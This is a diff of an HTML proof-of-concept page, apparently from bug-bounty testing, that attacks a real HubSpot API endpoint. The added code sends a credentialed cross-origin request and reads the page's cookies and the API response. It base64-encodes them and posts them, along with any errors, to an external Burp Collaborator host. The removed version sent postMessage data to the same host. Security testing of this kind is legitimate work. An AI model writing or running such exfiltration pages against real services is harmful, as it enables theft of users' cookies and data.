@@ -1,41 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HubSpot PostMessage Exploit</title>
+    <title>CORS Exploit</title>
 </head>
 <body>
-    <h1>PostMessage Test</h1>
-    <iframe id="hsFrame" src="https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth" sandbox="allow-scripts allow-same-origin"></iframe>
-    
+    <h1>Loading...</h1>
     <script>
-    // Listen for messages from HubSpot
-    window.addEventListener('message', function(event) {
-        if (event.origin === 'https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth') {
-            console.log('Received message:', event.data);
-            
-            // Send to Collaborator
-            fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    type: 'postmessage',
-                    data: event.data,
-                    origin: event.origin
-                })
-            });
-        }
+    fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/json',
+            'Origin': 'https://your-domain.com'
+        },
+        body: JSON.stringify([{
+            event: 'test',
+            properties: {
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            }
+        }])
+    })
+    .then(response => {
+        // Get response text
+        return response.text();
+    })
+    .then(data => {
+        // Get cookies (if any)
+        var cookies = document.cookie || 'No cookies (HttpOnly)';
+        
+        // Encode cookies in base64
+        var encodedCookies = btoa(unescape(encodeURIComponent(cookies)));
+        var encodedResponse = btoa(unescape(encodeURIComponent(data)));
+        
+        // Send to Collaborator
+        fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                response: encodedResponse,
+                response_raw: data,
+                cookies: encodedCookies,
+                cookies_raw: cookies,
+                origin: window.location.origin
+            })
+        });
+        
+        console.log('[+] Data sent to Collaborator!');
+        console.log('[+] Cookies (base64):', encodedCookies);
+        console.log('[+] Cookies (raw):', cookies);
+    })
+    .catch(error => {
+        // Send error to Collaborator
+        fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                error: error.toString(),
+                origin: window.location.origin
+            })
+        });
+        console.log('[-] Error:', error);
     });
-    
-    // Try to send message to HubSpot
-    var iframe = document.getElementById('hsFrame');
-    iframe.onload = function() {
-        try {
-            iframe.contentWindow.postMessage('getCookies', 'https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth');
-        } catch(e) {
-            console.log('PostMessage error:', e);
-        }
-    };
     </script>
 </body>
 </html>
-
